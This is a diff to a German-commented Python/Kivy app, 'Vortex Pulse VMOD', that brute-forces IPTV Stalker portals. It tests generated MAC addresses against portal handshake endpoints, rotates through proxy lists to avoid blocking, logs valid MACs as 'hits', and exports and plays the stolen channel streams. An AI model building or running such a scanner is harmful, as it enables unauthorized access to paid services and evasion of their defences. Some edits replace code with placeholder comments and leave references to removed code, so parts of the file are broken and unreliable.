@@ -12,6 +12,7 @@ from datetime import datetime
 import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+os.environ['KIVY_VIDEO'] = 'ffpyplayer'
 
 # Kivy-Framework Importe für die Benutzeroberfläche
 from kivy.app import App
@@ -26,6 +27,11 @@ from kivy.uix.textinput import TextInput
 from kivy.graphics import Color, Rectangle
 from kivy.animation import Animation
 from concurrent.futures import ThreadPoolExecutor
+from kivy.uix.video import Video
+from kivy.config import Config
+Config.set('graphics', 'fullscreen', 'auto')
+Config.set('graphics', 'window_state', 'maximized')
+from kivy.uix.modalview import ModalView
 
 # =============================================================================
 # PFAD- & RECHTE-VERWALTUNG
@@ -59,12 +65,34 @@ PATHS = {
     "panel_dir": os.path.join(BASE, "eingabe", "panel"),
     "combo_dir": os.path.join(BASE, "eingabe", "combo"),
     "hits_dir":  os.path.join(BASE, "Hits"),
-    "proxy_dir": os.path.join(BASE, "eingabe", "proxy")
+    "proxy_dir": os.path.join(BASE, "eingabe", "proxy"),
+    "fav_file":  os.path.join(BASE, "favorites.json")  # Korrigiert
 }
+
 
 # Verzeichnisse automatisch erstellen
 for folder in PATHS.values():
     os.makedirs(folder, exist_ok=True)
+    
+# Scannt den proxy_dir und gibt eine Liste von Requests-Proxy-Dicts zurück
+def load_proxies():
+    p_list = []
+    proxy_path = PATHS["proxy_dir"]
+    if not os.path.exists(proxy_path):
+        return p_list
+    
+    for f in os.listdir(proxy_path):
+        if f.endswith(".txt"):
+            with open(os.path.join(proxy_path, f), 'r', errors='ignore') as file:
+                for line in file:
+                    proxy = line.strip()
+                    if proxy:
+                        # Formatierung für das requests-Modul
+                        p_list.append({
+                            "http": f"http://{proxy}",
+                            "https": f"http://{proxy}"
+                        })
+    return p_list
 
 
 # =============================================================================
@@ -74,6 +102,7 @@ premium_mode = False  # Steuert, welche Logik verwendet wird
 stop_signal = threading.Event()    # Beendet alle Threads
 pause_event = threading.Event()    # Steuert die Pause-Funktion
 pause_event.set()                  # Initial auf "Laufen" gestellt
+PROXIES = []  # <--- UNBEDINGT HIER EINTRAGEN
 
 hit_lock = threading.Lock()        # Verhindert Schreibfehler bei Hits
 logged_hits = set()                # Speichert bereits gefundene MACs pro Session
@@ -230,6 +259,12 @@ def scan_single_job(panel_url, mac, filters=None, log_callback=None):
     base_url = panel_url.strip().rstrip('/')
     session = requests.Session()
     session.verify = False 
+
+    # --- PROXY ROTATION START ---
+    # Nutzt die globale Liste 'PROXIES' (muss in start_logic geladen werden)
+    if PROXIES:
+        session.proxies = random.choice(PROXIES)
+    # --- PROXY ROTATION END ---
     
     try:
         auth_data = get_auth_elements(mac)
@@ -248,7 +283,7 @@ def scan_single_job(panel_url, mac, filters=None, log_callback=None):
                 # Script 2 nutzt KEIN '&token=' im Handshake
                 hs_url = f"{try_url}/portal.php?type=stb&action=handshake&mac={mac_enc}"
             
-            r = session.get(hs_url, headers=build_headers(try_url, mac_enc, auth_data=auth_data), timeout=12)
+            r = session.get(hs_url, headers=build_headers(try_url, mac_enc, auth_data=auth_data), timeout=20)
             if r.status_code == 200:
                 data = r.json()
                 token = data.get("js", {}).get("token") or data.get("token")
@@ -270,7 +305,11 @@ def scan_single_job(panel_url, mac, filters=None, log_callback=None):
                         with open(file_path, "a", encoding="utf-8") as f:
                             if os.path.getsize(file_path) == 0: f.write(f"Server: {final_used_url}\n")
                             f.write(f"{mac} | Expiry: {expiry}\n")
-                        if log_callback: log_callback(f"[HIT] {mac} -> {expiry}")
+                        # LOG-AUSGABE MIT PORTAL UND HIT-MARKIERUNG
+                        if log_callback: 
+                            # Wir senden die volle URL, die MAC und das Datum
+                            log_callback(f"[HIT] {final_used_url} | {mac} | {expiry}", is_hit=True)
+
     except: pass
     finally:
         with hit_lock: stats["checked"] += 1
@@ -280,8 +319,7 @@ def scan_single_job(panel_url, mac, filters=None, log_callback=None):
 # M3U EXPORT LOGIK (INTEGRIERT)
 # =============================================================================
 
-def fetch_m3u_data(panel_url, mac, log_callback):
-    """Holt Kanäle und erstellt Stream-Links parallel."""
+def fetch_m3u_data(panel_url, mac, log_callback, filter_text=None):
     session = requests.Session()
     session.verify = False
     mac_enc = mac.replace(":", "%3A")
@@ -289,56 +327,61 @@ def fetch_m3u_data(panel_url, mac, log_callback):
     base_url = panel_url.strip().rstrip('/')
     
     try:
-        log_callback(f"[M3U] Handshake: {mac}")
-        # Handshake je nach Modus
-        if premium_mode:
-            hs_url = f"{base_url}/portal.php?type=stb&action=handshake&token=&mac={mac_enc}"
-        else:
-            hs_url = f"{base_url}/portal.php?type=stb&action=handshake&mac={mac_enc}"
-            
+        log_callback(f"[M3U] Handshake...")
+        hs_url = f"{base_url}/portal.php?type=stb&action=handshake&mac={mac_enc}"
         r = session.get(hs_url, headers=build_headers(base_url, mac_enc, auth_data=auth_data), timeout=10)
         token = r.json().get("js", {}).get("token") or r.json().get("token")
-        
-        if not token: return "Kein Token erhalten."
+        if not token: return "Kein Token."
 
-        log_callback("[M3U] Lade Kanalliste...")
-        c_url = f"{base_url}/portal.php?type=itv&action=get_all_channels&mac={mac_enc}&token={token}"
-        c_res = session.get(c_url, headers=build_headers(base_url, mac_enc, token, auth_data), timeout=10).json()
-        
-        chans = c_res.get("js", {}).get("data") or c_res.get("js", {}).get("channels") or c_res.get("js", {}).get("items") or []
-        if not chans: return "Keine Kanäle gefunden."
+        l_url = f"{base_url}/portal.php?type=itv&action=get_all_channels&mac={mac_enc}&token={token}"
+        live_data = session.get(l_url, headers=build_headers(base_url, mac_enc, token, auth_data), timeout=10).json()
+        live_chans = live_data.get("js", {}).get("data") or []
 
-        log_callback(f"[M3U] Extrahiere Links für {len(chans)} Sender...")
-        m3u_content = "#EXTM3U\n"
-        
-        def get_link(ch):
+        # --- VERBESSERTER FILTER ---
+        if filter_text:
+            ft = filter_text.upper().strip()
+            filtered_list = []
+            
+            # Regulärer Ausdruck für exaktere Suche:
+            # Sucht nach dem Kürzel am Anfang, Ende oder umschlossen von Sonderzeichen
+            pattern = re.compile(rf"(^|[^A-Z]){re.escape(ft)}([^A-Z]|$)", re.IGNORECASE)
+            
+            for ch in live_chans:
+                name = ch.get("name", "")
+                if pattern.search(name):
+                    filtered_list.append(ch)
+                # Backup: Suche nach "GERMANY" oder "DEUTSCHLAND" falls ft == "DE"
+                elif ft == "DE" and any(word in name.upper() for word in ["GERMANY", "DEUTSCHLAND", "GER "]):
+                    filtered_list.append(ch)
+            
+            live_chans = filtered_list
+        # ---------------------------
+
+        log_callback(f"[M3U] Verarbeite {len(live_chans)} Sender...")
+     
+        def process_link(ch):
             cmd = ch.get("cmd", "")
-            if not cmd: return None
             l_url = f"{base_url}/portal.php?type=itv&action=create_link&mac={mac_enc}&token={token}&cmd={requests.utils.quote(cmd)}"
             try:
-                l_res = session.get(l_url, headers=build_headers(base_url, mac_enc, token, auth_data), timeout=7).json()
-                link = l_res.get("js", {}).get("cmd") or l_res.get("js") or ""
+                res = session.get(l_url, headers=build_headers(base_url, mac_enc, token, auth_data), timeout=5).json()
+                link = res.get("js", {}).get("cmd") or res.get("js") or ""
                 link = re.sub(r'^(ffmpeg|auto|ffrt|rfat)\s+', '', str(link)).strip()
                 if link.startswith("http"):
+                    # Dies schickt den Sender an die Liste im Player
+                    app = App.get_running_app()
+                    Clock.schedule_once(lambda dt: app.add_to_player_list(ch.get('name'), link))
                     return f"#EXTINF:-1,{ch.get('name')}\n{link}"
-                return None
-            except: return None
+            except: pass
+            return None
 
-        # Nutzt ThreadPool für Speed (8 Threads)
-        with ThreadPoolExecutor(max_workers=8) as executor:
-            results = list(executor.map(get_link, chans))
-            for res in results:
-                if res: m3u_content += res + "\n"
-
-        filename = f"M3U_{mac.replace(':', '')}.m3u"
-        save_path = os.path.join(PATHS["hits_dir"], filename)
-        with open(save_path, "w", encoding="utf-8") as f:
-            f.write(m3u_content)
-            
-        return f"Erfolg! Gespeichert in Hits/{filename}"
-    except Exception as e:
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            results = list(executor.map(process_link, live_chans))
+            save_path = os.path.join(PATHS["hits_dir"], f"LIVE_{mac.replace(':','')}.m3u")
+            with open(save_path, "w", encoding="utf-8") as f:
+                f.write("#EXTM3U\n" + "\n".join(filter(None, results)))
+        return f"Erfolg: {len(live_chans)} Sender geladen."
+    except Exception as e: 
         return f"Fehler: {str(e)}"
-
 
 # =============================================================================
 # KIVY BENUTZEROBERFLÄCHE (UI)
@@ -346,22 +389,66 @@ def fetch_m3u_data(panel_url, mac, log_callback):
 
 class VortexApp(App):    
     def build(self):
-        # Hauptlayout & Hintergrund-Animation
-        self.root_layout = BoxLayout(orientation='vertical', padding=15, spacing=15)
-        with self.root_layout.canvas.before:
-            self.bg_color = Color(0, 0, 0, 1)
-            self.rect = Rectangle(size=(10000, 10000), pos=(0,0))
-        self.root_layout.bind(size=self._update_rect, pos=self._update_rect)
-        
-        anim = Animation(rgba=(0.05, 0, 0.15, 1), duration=3) + Animation(rgba=(0, 0, 0, 1), duration=3)
-        anim.repeat = True
-        anim.start(self.bg_color)
+        # Hauptlayout
+        self.root_layout = BoxLayout(orientation='vertical', padding=15, spacing=10)
+        # ... (deine Hintergrund-Animation bleibt gleich)
 
-        # UI Komponenten
+        # --- NEU: DER PLAYER-TOGGLE-BUTTON ---
+        self.toggle_player_btn = Button(
+            text="📺 PLAYER ANZEIGEN",
+            size_hint_y=None, height=100,
+            background_color=(0.1, 0.4, 0.6, 1)
+        )
+        self.toggle_player_btn.bind(on_press=self.toggle_player_visibility)
+        self.root_layout.add_widget(self.toggle_player_btn)
+
+        # --- PLAYER BEREICH (Initial versteckt) ---
+        self.player_layout = BoxLayout(
+            orientation='horizontal', 
+            size_hint_y=None, 
+            height=0,      # Startet bei 0
+            opacity=0,     # Unsichtbar
+            spacing=5
+        )
+        
+        # Linke Seite: Kanalliste
+        self.channel_scroll = ScrollView(size_hint_x=0.35, bar_width=10)
+        self.channel_list = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
+        self.channel_list.bind(minimum_height=self.channel_list.setter('height'))
+        self.channel_scroll.add_widget(self.channel_list)
+        
+        # Rechte Seite: Video + Favoriten-Button
+        video_stack = BoxLayout(orientation='vertical')
+        self.video = Video(source='', state='stop', options={'eos': 'loop'})
+        self.fav_star_btn = Button(
+            text="⭐ FAVORIT +/-",
+            size_hint_y=None, height=70,
+            background_color=(0.9, 0.7, 0, 1)
+        )
+        self.fav_star_btn.bind(on_press=self.toggle_current_favorite)
+        
+        video_stack.add_widget(self.video)
+        video_stack.add_widget(self.fav_star_btn)
+        
+        self.player_layout.add_widget(self.channel_scroll)
+        self.player_layout.add_widget(video_stack)
+        self.root_layout.add_widget(self.player_layout)
+        self.fs_btn = Button(
+            text="📺 VOLLBILD",
+            size_hint_y=None, height=70,
+            background_color=(0.2, 0.2, 0.2, 1)
+        )
+        self.fs_btn.bind(on_press=self.open_fullscreen)
+        video_stack.add_widget(self.fs_btn)        
+
+        # --- RESTLICHE UI (Status, Filter, Buttons etc.) ---
+        # Hier folgen deine restlichen Widgets wie gehabt...
+        # Tipp: Nutze etwas kleinere Höhen (z.B. height=80 statt 100), damit alles passt.
+
+        # --- UI KOMPONENTEN ---
         self.status_label = Label(text="Vortex Pulse VMOD - Platinum", size_hint_y=None, height=80, font_size='18sp', bold=True)
         self.root_layout.add_widget(self.status_label)
 
-        # Thread-Slider
         speed_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=60)
         self.speed_info = Label(text=f"Threads: {current_threads}", size_hint_x=0.3)
         self.speed_slider = Slider(min=1, max=25, value=current_threads, step=1)
@@ -369,11 +456,9 @@ class VortexApp(App):
         speed_box.add_widget(self.speed_info); speed_box.add_widget(self.speed_slider)
         self.root_layout.add_widget(speed_box)
 
-        # Eingabefelder
         self.filter_input = TextInput(hint_text="Länderfilter (z.B. DE, TR, EU)", multiline=False, size_hint_y=None, height=90, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
         self.root_layout.add_widget(self.filter_input)
 
-        # MAC-Generator Sektion
         gen_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=90, spacing=10)
         self.gen_count = TextInput(text="1000", multiline=False, input_filter="int", size_hint_x=0.3)
         self.gen_btn = Button(text="MACs GEN", background_color=(0.2, 0.6, 1, 1))
@@ -381,112 +466,158 @@ class VortexApp(App):
         gen_box.add_widget(self.gen_count); gen_box.add_widget(self.gen_btn)
         self.root_layout.add_widget(gen_box)
 
-        # --- NEU: EINGABEFELDER FÜR MUX ---
         m3u_input_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=90, spacing=10)
-        self.m3u_portal = TextInput(hint_text="Portal URL eingeben", multiline=False, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
-        self.m3u_mac = TextInput(hint_text="MAC Adresse eingeben", multiline=False, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
-        
-        m3u_input_box.add_widget(self.m3u_portal)
-        m3u_input_box.add_widget(self.m3u_mac)
+        self.m3u_portal = TextInput(hint_text="Portal URL", multiline=False, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
+        self.m3u_mac = TextInput(hint_text="MAC Adresse", multiline=False, background_color=(1,1,1,0.1), foreground_color=(1,1,1,1))
+        m3u_input_box.add_widget(self.m3u_portal); m3u_input_box.add_widget(self.m3u_mac)
         self.root_layout.add_widget(m3u_input_box)
-        # ---------------------------------
 
-        # M3U Button (bleibt fast gleich, nur Text angepasst)
-        self.m3u_btn = Button(
-            text="DIESE MAC ZU M3U WANDELN", 
-            size_hint_y=None, 
-            height=100, 
-            background_color=(0.6, 0.2, 0.8, 1) # Lila
-        )
+        self.m3u_btn = Button(text="DIESE MAC ZU M3U WANDELN", size_hint_y=None, height=100, background_color=(0.6, 0.2, 0.8, 1))
         self.m3u_btn.bind(on_press=self.start_m3u_export)
         self.root_layout.add_widget(self.m3u_btn)
 
+        self.load_m3u_btn = Button(
+            text="EXISTIERENDE M3U LADEN", 
+            size_hint_y=None, 
+            height=100, 
+            background_color=(0.1, 0.6, 0.4, 1)
+        )
+        self.load_m3u_btn.bind(on_press=self.open_m3u_selector)
+        self.root_layout.add_widget(self.load_m3u_btn)
 
-        # Log-Bereich
-        self.log_area = TextInput(readonly=True, background_color=(0,0,0,0.5), foreground_color=(0,1,1,1), font_size='13sp')
-        scroll = ScrollView(); scroll.add_widget(self.log_area); self.root_layout.add_widget(scroll)
+        self.scroll_view = ScrollView(do_scroll_x=False, size_hint=(1, 1), bar_width=10)
+        self.log_container = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
+        self.log_container.bind(minimum_height=self.log_container.setter('height'))
+        self.scroll_view.add_widget(self.log_container)
+        self.root_layout.add_widget(self.scroll_view)
 
-        # Buttons
+        self.fav_show_btn = Button(
+            text="⭐ MEINE FAVORITEN", 
+            size_hint_y=None, 
+            height=100, 
+            background_color=(0.8, 0.2, 0.2, 1)
+        )
+        self.fav_show_btn.bind(on_press=self.show_favorites)
+        self.root_layout.add_widget(self.fav_show_btn)
+
         self.hits_btn = Button(text="HITS ORDNER ÖFFNEN", size_hint_y=None, height=100, background_color=(0.2, 0.4, 0.8, 1))
         self.hits_btn.bind(on_press=self.open_hits)
         self.root_layout.add_widget(self.hits_btn)
 
-        # Premium/Gold Modus Button
-        self.mode_btn = Button(
-            text="MODUS: GOLD (Script 2)", 
-            size_hint_y=None, 
-            height=100, 
-            background_color=(1, 0.8, 0, 1) # Goldene Farbe
-        )
-
-        btn_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=120, spacing=10)
+        self.mode_btn = Button(text="MODUS: GOLD (Script 2)", size_hint_y=None, height=100, background_color=(1, 0.8, 0, 1))
         self.mode_btn.bind(on_press=self.toggle_mode)
         self.root_layout.add_widget(self.mode_btn)
       
+        btn_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=120, spacing=10)
         self.start_btn = Button(text="START", background_color=(0,0.8,0,1)); self.start_btn.bind(on_press=self.start_logic)
         self.pause_btn = Button(text="PAUSE", disabled=True, background_color=(1, 0.5, 0, 1)); self.pause_btn.bind(on_press=self.toggle_pause)
         self.exit_btn = Button(text="EXIT", background_color=(0.4,0.4,0.4,1)); self.exit_btn.bind(on_press=self.stop_app)
-        
         btn_layout.add_widget(self.start_btn); btn_layout.add_widget(self.pause_btn); btn_layout.add_widget(self.exit_btn)
         self.root_layout.add_widget(btn_layout)
         
         Clock.schedule_interval(self.refresh_ui, 0.5)
         return self.root_layout
 
-    # --- UI Helfer-Funktionen ---
-    
+    # --- UI HELFER ---
     def _update_rect(self, instance, value):
         self.rect.pos = instance.pos
         self.rect.size = instance.size
 
-    def open_hits(self, instance):
-        if platform == 'android':
-            try:
-                PythonActivity = autoclass('org.kivy.android.PythonActivity')
-                Intent = autoclass('android.content.Intent')
-                Uri = autoclass('android.net.Uri')
-                intent = Intent(Intent.ACTION_VIEW)
-                intent.setDataAndType(Uri.parse(PATHS["hits_dir"]), "resource/folder")
-                PythonActivity.mActivity.startActivity(intent)
-            except: self.update_log("Fehler beim Öffnen des Managers.")
-        else: webbrowser.open(PATHS["hits_dir"])
-
     def update_speed(self, instance, value):
-        global current_threads; current_threads = int(value); self.speed_info.text = f"Threads: {current_threads}"
+        global current_threads
+        current_threads = int(value)
+        self.speed_info.text = f"Threads: {current_threads}"
 
     def do_generate(self, instance):
-        count = int(self.gen_count.text) if self.gen_count.text else 0
-        self.update_log("Datenbank-Check...")
-        num, name = generate_random_macs(count)
-        self.update_log(f"-> {num} MACs in {name} gespeichert.")
+        count = int(self.gen_count.text) if self.gen_count.text.isdigit() else 0
+        if count > 0:
+            self.update_log(f"Generiere {count} MACs...")
+            num, name = generate_random_macs(count)
+            self.update_log(f"-> {num} MACs in {name} gespeichert.")
 
     def toggle_pause(self, instance):
         if pause_event.is_set():
-            pause_event.clear(); self.pause_btn.text = "WEITER"; self.pause_btn.background_color = (0, 0.5, 1, 1)
+            pause_event.clear()
+            self.pause_btn.text = "WEITER"
+            self.pause_btn.background_color = (0, 0.5, 1, 1)
         else:
-            pause_event.set(); self.pause_btn.text = "PAUSE"; self.pause_btn.background_color = (1, 0.5, 0, 1)
+            pause_event.set()
+            self.pause_btn.text = "PAUSE"
+            self.pause_btn.background_color = (1, 0.5, 0, 1)
 
     def refresh_ui(self, dt):
-        # Wir entfernen die Bedingung "if stats['is_running']", 
-        # damit die Anzeige auch nach dem Ende korrekt bleibt.
         rem = max(0, stats['total'] - stats['checked'])
         self.status_label.text = f"Geprüft: {stats['checked']} | Hits: {stats['hits']} | Übrig: {rem}"
 
-
-    def update_log(self, text):
-        def _add(dt): 
-            self.log_area.text += f"{text}\n"
-            self.log_area.cursor = (0, len(self.log_area.text))
+    # --- LOGGING & COPY ---
+    def update_log(self, text, is_hit=False):
+        def _add(dt):
+            btn = Button(
+                text=text, size_hint_y=None, height=100,
+                halign='left', valign='middle',
+                background_normal='',
+                background_color=(0.12, 0.12, 0.12, 1) if not is_hit else (0, 0.3, 0.5, 1),
+                font_size='13sp', padding=(25, 0)
+            )
+            btn.bind(size=btn.setter('text_size'))
+            if "[HIT]" in text:
+                btn.bind(on_press=self.copy_to_fields)
+            self.log_container.add_widget(btn)
+            self.scroll_view.scroll_y = 0
+            if len(self.log_container.children) > 150:
+                self.log_container.remove_widget(self.log_container.children[-1])
         Clock.schedule_once(_add)
 
-    # --- Scanner Steuerung ---
+    def copy_to_fields(self, instance):
+        try:
+            content = instance.text.replace("[HIT] ", "")
+            parts = content.split(" | ")
+            if len(parts) >= 2:
+                self.m3u_portal.text = parts[0].strip()
+                self.m3u_mac.text = parts[1].strip()
+                instance.background_color = (0, 1, 0.5, 1)
+                Clock.schedule_once(lambda dt: setattr(instance, 'background_color', (0, 0.4, 0.4, 1)), 0.3)
+        except: pass
 
+    # --- FAVORITEN LOGIK ---
+    def load_fav_data(self):
+        if os.path.exists(PATHS["fav_file"]):
+            with open(PATHS["fav_file"], 'r', encoding='utf-8') as f:
+                return json.load(f)
+        return {}
+
+    def toggle_current_favorite(self, instance):
+        if not self.video.source: return
+        name = getattr(self, 'current_channel_name', "Unbekannter Sender")
+        url = self.video.source
+        favs = self.load_fav_data()
+        if name in favs:
+            del favs[name]
+            instance.text = "⭐ ZU FAVORITEN HINZUFÜGEN"
+        else:
+            favs[name] = url
+            instance.text = "🌟 AUS FAVORITEN ENTFERNEN"
+        with open(PATHS["fav_file"], 'w', encoding='utf-8') as f:
+            json.dump(favs, f, indent=4)
+
+    def show_favorites(self, instance):
+        favs = self.load_fav_data()
+        self.channel_list.clear_widgets()
+        for name, url in favs.items():
+            self.add_to_player_list(name, url, is_fav_view=True)
+        self.update_log(f"{len(favs)} Favoriten geladen.")
+
+    # --- SCANNER STEUERUNG ---
     def start_logic(self, instance):
-        global logged_hits
+        global logged_hits, PROXIES
         logged_hits.clear()
-        stop_signal.clear(); pause_event.set()
+        PROXIES = load_proxies()
+        stop_signal.clear()
+        pause_event.set()
         stats.update({"checked": 0, "hits": 0, "total": 0, "is_running": True})
-        self.log_area.text = ""; self.status_label.text = "Lade Daten..."
+        self.log_container.clear_widgets()
+        # ... (Rest der Datei-Lade-Logik aus deinen vorherigen Versionen)
+
         
         def load_unique(dir_path):
             data = set()
@@ -507,7 +638,8 @@ class VortexApp(App):
 
         macs = load_unique(PATHS["combo_dir"])
         if not panels or not macs:
-            self.update_log("FEHLER: Keine Panels oder MACs gefunden!"); stats["is_running"] = False
+            self.update_log("FEHLER: Keine Panels oder MACs gefunden!")
+            stats["is_running"] = False
             return
 
         jobs = [(p, m) for p in panels for m in macs]
@@ -517,7 +649,8 @@ class VortexApp(App):
         f_text = self.filter_input.text.strip()
         filters = [f.strip() for f in f_text.split(",") if f.strip()] if f_text else None
         
-        self.start_btn.disabled = True; self.pause_btn.disabled = False
+        self.start_btn.disabled = True
+        self.pause_btn.disabled = False
         threading.Thread(target=self.run_scanner, args=(jobs, filters), daemon=True).start()
 
     def run_scanner(self, jobs, filters):
@@ -538,17 +671,16 @@ class VortexApp(App):
 
     def finish_scan(self):
         stats["is_running"] = False
-        # Setze die Anzeige manuell auf das Maximum, um Rundungsfehler/Timing-Fehler zu vermeiden
         self.status_label.text = f"Geprüft: {stats['total']} | Hits: {stats['hits']} | Übrig: 0"
-        
         self.start_btn.disabled = False
         self.pause_btn.disabled = True
         self.pause_btn.text = "PAUSE"
         self.update_log("--- SCAN BEENDET ---")
 
-
     def stop_app(self, instance):
-        stop_signal.set(); pause_event.set(); App.get_running_app().stop()
+        stop_signal.set()
+        pause_event.set()
+        App.get_running_app().stop()    
 
     def toggle_mode(self, instance):
         global premium_mode
@@ -562,25 +694,179 @@ class VortexApp(App):
             self.mode_btn.background_color = (1, 0.8, 0, 1) # Gold
 
     def start_m3u_export(self, instance):
-        """Liest Portal und MAC aus den Textfeldern und startet den Export."""
+        """Liest Portal, MAC und Filter aus den Textfeldern und startet den Export."""
         portal = self.m3u_portal.text.strip()
         mac = self.m3u_mac.text.strip()
+        current_filter = self.filter_input.text.strip() # Filter auslesen
 
         if not portal or not mac:
             self.update_log("FEHLER: Bitte Portal und MAC oben eintippen!")
             return
 
-        # Sicherstellen, dass die URL mit http anfängt
         if not portal.startswith("http"):
             portal = "http://" + portal
 
         def run():
             self.update_log(f"[M3U] Starte Export für: {mac}")
-            # Ruft die fetch_m3u_data Logik auf, die du schon im Script hast
-            res = fetch_m3u_data(portal, mac, self.update_log)
+            # Filter wird hier mitgegeben
+            res = fetch_m3u_data(portal, mac, self.update_log, filter_text=current_filter)
             self.update_log(f"STATUS: {res}")
 
         threading.Thread(target=run, daemon=True).start()
+        
+    def open_m3u_selector(self, instance):
+        """Zeigt alle verfügbaren M3U-Dateien im Hits-Ordner an."""
+        self.log_container.clear_widgets()
+        self.update_log("--- VERFÜGBARE LISTEN ---")
+        
+        if not os.path.exists(PATHS["hits_dir"]):
+            self.update_log("Keine Hits gefunden.")
+            return
+
+        files = [f for f in os.listdir(PATHS["hits_dir"]) if f.endswith(".m3u")]
+        
+        if not files:
+            self.update_log("Keine .m3u Dateien im Ordner.")
+            return
+
+        for f in files:
+            btn = Button(
+                text=f"LISTE: {f}",
+                size_hint_y=None,
+                height=100,
+                background_color=(0.2, 0.5, 0.2, 1)
+            )
+            # Wichtig: path=f fixiert den aktuellen Dateinamen im Lambda
+            btn.bind(on_press=lambda inst, filename=f: self.load_existing_m3u(filename))
+            self.log_container.add_widget(btn)
+
+    def load_existing_m3u(self, filename):
+        """Liest eine M3U-Datei aus und füllt die Player-Liste."""
+        path = os.path.join(PATHS["hits_dir"], filename)
+        self.channel_list.clear_widgets()
+        self.update_log(f"Lade {filename}...")
+        
+        try:
+            count = 0
+            if not os.path.exists(path): return
+            
+            with open(path, 'r', encoding='utf-8') as f:
+                current_name = None
+                for line in f:
+                    line = line.strip()
+                    if line.startswith("#EXTINF"):
+                        current_name = line.split(",")[-1] if "," in line else "Unbekannter Sender"
+                    elif line.startswith("http") and current_name:
+                        self.add_to_player_list(current_name, line)
+                        count += 1
+                        current_name = None 
+            
+            self.update_log(f"Erfolg: {count} Sender geladen!")
+            # Öffne den Player automatisch, wenn Sender geladen wurden
+            if count > 0 and self.player_layout.height == 0:
+                self.toggle_player_visibility(None)
+        except Exception as e:
+            self.update_log(f"Fehler beim Laden: {str(e)}")
+
+
+
+    def toggle_favorite(self, name, url):
+        """Speichert oder entfernt einen Sender aus den Favoriten."""
+        favs = self.load_fav_data()
+        
+        if name in favs:
+            del favs[name]
+            self.update_log(f"Entfernt: {name}")
+        else:
+            favs[name] = url
+            self.update_log(f"Favorit hinzugefügt: {name}", is_hit=True)
+            
+        with open(PATHS["fav_file"], 'w', encoding='utf-8') as f:
+            json.dump(favs, f, indent=4)
+        
+        if not favs:
+            self.update_log("Noch keine Favoriten gespeichert.")
+            return
+
+        for name, url in favs.items():
+            self.add_to_player_list(name, url, is_fav_view=True)
+        self.update_log(f"{len(favs)} Favoriten geladen.")
+
+    def toggle_player_visibility(self, instance):
+        if self.player_layout.height == 0:
+            # Player einblenden
+            self.player_layout.height = 450
+            self.player_layout.opacity = 1
+            self.toggle_player_btn.text = "❌ PLAYER SCHLIESSEN"
+            self.toggle_player_btn.background_color = (0.6, 0.1, 0.1, 1)
+        else:
+            # Player ausblenden
+            self.player_layout.height = 0
+            self.player_layout.opacity = 0
+            self.toggle_player_btn.text = "📺 PLAYER ANZEIGEN"
+            self.toggle_player_btn.background_color = (0.1, 0.4, 0.6, 1)
+            self.video.state = 'stop' # Video stoppen wenn man schließt
+
+    def open_fullscreen(self, instance):
+        if not self.video.source:
+            self.update_log("Kein aktiver Stream für Vollbild.")
+            return
+
+        # Erstelle ein Overlay-Fenster
+        view = ModalView(auto_dismiss=True, background_color=(0, 0, 0, 1))
+        
+        # Erstelle ein neues Video-Widget für den Vollbildmodus
+        fs_video = Video(
+            source=self.video.source,
+            state='play',
+            options={'eos': 'loop'}
+        )
+        
+        # Schließe das Fenster bei Klick auf das Video
+        fs_video.bind(on_touch_down=lambda inst, touch: view.dismiss())
+        
+        view.add_widget(fs_video)
+        view.open()
+
+    def play_stream(self, url):
+        """Stoppt das aktuelle Video und startet den neuen Stream."""
+        try:
+            self.video.unload()  # Alten Stream aus dem Speicher werfen
+            self.video.source = url
+            self.video.state = 'play'
+            self.update_log(f"Stream gestartet: {self.current_channel_name}")
+        except Exception as e:
+            self.update_log(f"Video-Fehler: {str(e)}")
+
+    def add_to_player_list(self, name, url, is_fav_view=False):
+        """Fügt einen Button zur Kanalliste im Player hinzu."""
+        bg_color = (0.5, 0.1, 0.2, 1) if is_fav_view else (0.1, 0.2, 0.4, 1)
+        btn = Button(
+            text=name, size_hint_y=None, height=70, 
+            background_color=bg_color, font_size='12sp'
+        )
+        
+        def play_callback(instance):
+            self.current_channel_name = name
+            self.play_stream(url)
+            # Kleiner visueller Effekt beim Klick
+            instance.background_color = (0, 0.8, 1, 1)
+            Clock.schedule_once(lambda dt: setattr(instance, 'background_color', bg_color), 0.2)
+
+        btn.bind(on_press=play_callback)
+        self.channel_list.add_widget(btn)
+
+    def open_hits(self, instance):
+        """Öffnet den Hits-Ordner im Dateimanager oder Browser."""
+        try:
+            # Auf Android öffnen wir den Pfad im Browser/Explorer
+            if platform == 'android':
+                self.update_log(f"Ordner: /Download/Vortex_Pulse/Hits")
+            else:
+                # Auf dem Desktop öffnen wir den echten Ordner
+                webbrowser.open(PATHS["hits_dir"])
+        except Exception as e:
+            self.update_log(f"Fehler beim Öffnen: {e}")
 
 if __name__ == "__main__":
     VortexApp().run()
